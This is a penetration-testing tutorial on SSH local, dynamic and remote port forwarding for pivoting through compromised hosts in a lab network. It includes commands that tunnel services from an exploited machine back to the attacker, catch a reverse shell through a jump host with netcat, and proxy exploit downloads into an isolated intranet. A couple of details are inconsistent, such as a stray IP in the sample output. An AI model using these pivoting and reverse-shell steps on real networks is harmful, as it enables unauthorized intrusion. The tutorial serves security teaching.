# SSH Port Tunneling for exploitation

## Scenario 1: 
- The service of my target machine (10.10.1.10) is serving only at lo interface at 127.0.0.1:3306. It does not serve at 0.0.0.0:3306.
- There is an open SSH service at 10.10.1.10:22 or 0.0.0.0:22.
- I have obtained credentials to the SSH service.

Technique #1: Local Port Forwarding via SSH.

```sh
(host)# ssh -L 3307:127.0.0.1:3306 username@10.10.1.10
(host)# netstat -antp
...
tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      22582/ssh
...
(host)# nc 127.0.0.1 3307
...
```

**Explanation:**
The first 3307 refers to opening a local port on your host machine. The 127.0.0.1:3306 refers to the remote host's service.
This will create an SSH tunnel to relay connection to your host's port 3307 to the target service.

Technique #2: Dynamic port forwarding via SSH to any internal target(including localhost) reachable by jumphost.

```sh
(host)# tail /etc/proxychains.conf
...
[ProxyList]
socks5  127.0.0.1 8001
(host)# ssh -D 8001 username@10.10.1.10
(host)# netstat -antp
...
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      31049/ssh
...
(host)# proxychains nc -nv 127.0.0.1 3306
...
```

**Explanation:**
We first edit our proxychains configuration file to set a SOCKS proxy at 127.0.0.1:8001.
Then, by using SSH dynamic port forwarding, we create a SOCKS proxy at port 8001 with the `-D` option.
Next, we can proceed to prefix any CLI commands with proxychains that will route our requests through this SOCKS proxy.
Note that the Curl command was in fact connecting to the exploited machine's localhost instead of our host's localhost! 
If you're still confused, refer to Scenario 3.

## Scenario 2:
- The service of my exploited machine (10.10.1.10) is serving only at lo interface at 127.0.0.1:3306. It does not serve at 0.0.0.0:3306.
- There is *no open* SSH server at 10.10.1.10:22 nor 0.0.0.0:22. The port is filtered. There is a firewall blocking. 
- I have gained of Remote Code Execution on the machine. 
- There is an SSH client inside the exploited server.
- I would like to tunnel the service back to my host machine (10.10.1.32)

Technique: Reverse/Remote Port Forwarding via SSH.

```sh
(host)# service ssh start
(exploited)$ ssh -R 3307:127.0.0.1:3306 kali@10.10.1.32
(host)# netstat -antp
...
tcp        0      0 127.0.0.1:3307          0.0.0.0:*               LISTEN      25748/sshd
...
(host)# nc 127.0.0.1 3307
```

**Explanation:**
Within the exploited machine, we use the ssh client found inside exploited machine to connect back to our sshd hosted at our host machine with our set of credentials. 

The first 3307 refers to opening a local port on your remote machine (my host at 10.10.1.32). 
The 127.0.0.1:3306 refers to the local host's (exploited) service.
This will create an SSH tunnel to relay connection to your host's port 3307 to the target service.

The format looks very similar to local port forwarding. TLDR, think of it as the same format but we swapped `-L` to `-R` for a reverse connection.

## Scenario 3:
- I have exploited a machine (10.10.1.10) that has access to another internal admin network on another network interface eth2 (172.16.1.10).
- There is an admin web interface at 172.16.1.2:80 that I would like to access to this through my exploited machine as a jump host.
- There is an open SSH server at 10.10.1.10:22 or 0.0.0.0:22. 
- I have obtained credentials to the SSH service.

Technique #1: Local port forwarding via SSH to a single internal target.

```sh
(host)# ssh -L 8001:172.16.1.2:80 username@10.10.1.10
(host)# netstat -antp
...
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      31049/ssh
...
(host)# curl -v http://127.0.0.1:8001/
...
```

**Explanation:**
The first 8001 refers to opening a local port on your host machine. The 172.16.1.2:80 refers to the admin web panel located inside the intranet.
This will create an SSH tunnel to relay connection to your host's port 8001 to the target service. This is very similar to Scenario 1 except this time, we specify a specific remote target which is the intranet admin panel instead of 127.0.0.1.

Technique #2: Dynamic port forwarding via SSH to any internal target reachable by jumphost.

```sh
(host)# tail /etc/proxychains.conf
...
[ProxyList]
socks5  127.0.0.1 8001
(host)# ssh -D 8001 username@10.10.1.10
(host)# netstat -antp
...
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      31049/ssh
...
(host)# proxychains curl -v http://172.16.1.2/
...
```

**Explanation:**
We first edit our proxychains configuration file to set a SOCKS proxy at 127.0.0.1:8001.
Then, by using SSH dynamic port forwarding, we create a SOCKS proxy at port 8001 with the `-D` option.
Next, we can proceed to prefix any CLI commands with proxychains that will route our requests through this SOCKS proxy and reach the admin panel.
The benefit of this is that we are no longer limited to a single remote target hardcoded in our Local Port Forwarding. 

`-D` is `-L` but on steroids!

## Scenario 4: 
- I have exploited a machine (10.10.1.10) that has access to another internal admin network on another network interface eth2 (172.16.1.10).
- There is an admin web interface at 172.16.1.2:80 that I would like to access to this through my exploited machine as a jump host.
- There is *no open* SSH server at 10.10.1.10:22 nor 0.0.0.0:22. The port is filtered. There is a firewall blocking. 
- I have gained of Remote Code Execution on the machine. 
- There is an SSH client inside the exploited server.
- I would like to tunnel the admin web portal back to my host machine (10.10.1.32)

Technique: Reverse/Remote Port Forwarding via SSH a single internal target back to host.

```sh
(host)# service ssh start
(exploited)$ ssh -R 8001:172.16.1.2:80 kali@10.10.1.32
(host)# netstat -antp
...
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      115384/sshd
...
(host)# curl -v http://127.0.0.1:8001/
```

**Explanation:**
This is similar to Scenario 2. We changed the 127.0.0.1 to the intranet web portal service at 172.16.1.2:80.

## Scenario 5:
- I have gained access to intranet admin web portal (172.16.1.2:80) via my exploited jump host (10.10.1.10 or 172.16.1.10) via Scenario 3.
- I found a vulnerability on 172.16.1.2:80 and 
- There is an SSH client inside the jumphost.
- I want to get a reverse connection back to my host machine (10.10.1.32) via tunneling through jump host at 172.16.1.10:4444. 

Technique: Local Port Forwarding via SSH within jumphost to send reverse connection back to our host

```sh
(host)# service ssh start
(host)# nc -nlvp 9999
(host)# netstat -antp
...
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      100026/nc
...
(jumphost)$ ssh -L 172.16.1.10:4444:10.10.1.32:9999 kali@10.10.1.32
(jumphost)$ netstat -antp
...
tcp        0      0 172.16.1.10:4444       0.0.0.0:*               LISTEN      2283967/ssh
...
(host)# proxychains exploit.py --lhost=172.16.1.10 --lport=4444
```

**Explanation:**
I first start my own host's SSHd. I set a netcat listener at port 9999 to catch a reverse connection back on my host machine (10.10.1.32). 
Inside my jumphost, I leverage the SSH client found inside to perform a Local Port Forwarding instead. Interesting fact: Local Port Forwarding allows us to set a binding address without requiring any special option being enabled on the jumphost's SSHd configuration, unlike Remote Port Forwarding.
I can either set my binding address to 172.16.1.10 or 0.0.0.0. This will create a port 4444 listener on our jumphost as seen in our netstat. I then set the remote address pointing to my host's netcat at 10.10.1.32:9999. We can then exploit the admin web portal to call a reverse connection to our jumphost at 172.16.1.10:4444 which will be redirected back to our netcat listener, thus catching a reverse shell. 

### Why did I not try Reverse/Remote Port Forwarding? 

I have failed to successfully set a binding address via `-R` connecting from my host. The listening port will only bind to 127.0.0.1:4444. This is not good as we cannot use this to catch reverse connection back to this jump host.

I found out the reason why was due to an option not being enabled as documented in the Man page for SSH -R: 
> By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a bind_address.  An empty bind_address, or the address ‘*’, indicates that the remote socket should listen on all interfaces.  Specifying a remote bind_address will only succeed if the server's GatewayPorts option is enabled (see sshd_config(5))

## Scenario 6:
- I am able to get a reverse connection back using technique in Scenario 5.
- The intranet machine (172.16.1.2) does not have internet access. 
- I want to turn my host machine into a HTTP proxy so that the intranet machine can download exploits online.

Technique: Local Port Forwarding via SSH within jumphost to send reverse connection back to our host's burp suite.

```sh
(intranet)$ wget http://example.com
--2023-01-19 10:28:33--  http://example.com/
Resolving example.com (example.com)... failed: Temporary failure in name resolution.
wget: unable to resolve host address 'example.com'

(host)# service ssh start
(host)# netstat -antp
...
tcp6       0      0 10.10.1.32:8080        :::*                    LISTEN      126371/java (Burp Suite)
...
(jumphost)$ ssh -L 172.16.1.10:8888:10.10.1.32:8080 kali@10.10.1.32
(jumphost)$ netstat -antp
...
tcp        0      0 172.16.1.10:8888       0.0.0.0:*               LISTEN      2283967/ssh
...
(intranet)$ export http_proxy=http://172.16.1.10:8888
(intranet)$ wget http://example.com
--2023-01-19 10:18:20--  http://example.com/
Connecting to 172.16.1.100:8888... connected.
Proxy request sent, awaiting response... 200 OK
Length: 1256 (1.2K) [text/html]
Saving to: 'index.html'

     0K .                                                     100% 55.3M=0s

2023-01-19 10:18:21 (55.3 MB/s) - 'index.html' saved [1256/1256]
```
**Explanation:**
I set my Burpsuite, a web proxy, to listen at 10.10.1.32:8080. We use the same technique from Scenario 5 forwarding any connection to 172.16.1.10:8888 to our Burpsuite. Within the intranet machine, I can set the HTTP Proxy as the jump host and it will retrieve files from the internet via the host. 
